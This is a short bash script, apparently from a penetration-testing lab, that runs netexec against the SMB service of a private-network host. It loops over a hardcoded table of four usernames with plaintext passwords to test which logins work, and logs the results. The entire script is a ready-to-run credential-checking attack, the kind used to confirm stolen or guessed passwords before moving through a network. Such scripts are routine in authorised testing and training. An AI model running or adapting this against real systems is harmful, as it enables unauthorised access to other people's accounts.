#!/bin/bash

TARGET="192.168.57.31"
LOG="/opt/lab/$(date +%Y%m%d)_check_creds.log"

declare -A USERS=(
    ["sofia.cross"]="Be0E(qR@ep51oH)"
    ["alec.jarvis"]="Z3f%^3eVuFgGzJt"
    ["clinton.stewart"]="magnificent"
    ["effie.carr"]="RhlWw0IkKC&4HFq"
)

for user in "${!USERS[@]}"; do
    pass="${USERS[$user]}"
    echo "[*] Testing $user"
    netexec smb "$TARGET" -u "$user" -p "$pass" --log "$LOG"
done
